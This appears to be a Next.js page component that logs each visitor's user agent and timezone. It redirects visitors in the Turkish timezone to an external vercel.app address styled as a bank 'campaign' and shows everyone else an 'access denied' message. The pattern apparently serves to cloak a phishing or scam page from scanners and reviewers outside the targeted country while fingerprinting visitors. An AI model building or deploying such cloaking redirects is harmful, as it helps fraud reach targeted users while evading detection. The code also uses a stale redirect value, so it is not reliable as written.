'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

export default function Home() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(true);
  const [redirectUrl, setRedirectUrl] = useState('https://bbnsbnkampanya.vercel.app/');

  useEffect(() => {
    const checkTimezone = async () => {
      try {
        // Get timezone from client
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const isTurkishTimezone = timezone === 'Europe/Istanbul' || timezone.includes('Turkey');

        // Get redirect URL
        const redirectResponse = await fetch('/api/redirect-link');
        if (redirectResponse.ok) {
          const { url } = await redirectResponse.json();
          setRedirectUrl(url);
        }

        // Log the access
        await fetch('/api/log', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            ip: 'Unknown',
            userAgent: navigator.userAgent,
            timezone,
            isTurkishTimezone,
            timestamp: new Date().toISOString()
          }),
        });

        if (isTurkishTimezone) {
          window.location.replace(redirectUrl);
        } else {
          setIsLoading(false);
        }
      } catch (error) {
        console.error('Error:', error);
        setIsLoading(false);
      }
    };

    checkTimezone();
  }, []);

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#0D1117]">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#58A6FF]"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#0D1117]">
      <div className="text-center">
        <h1 className="text-2xl font-bold text-gray-300 mb-4">Erişim Reddedildi</h1>
        <p className="text-gray-400">Bu sayfaya sadece Türkiye'den erişilebilir.</p>
      </div>
    </div>
  );
}
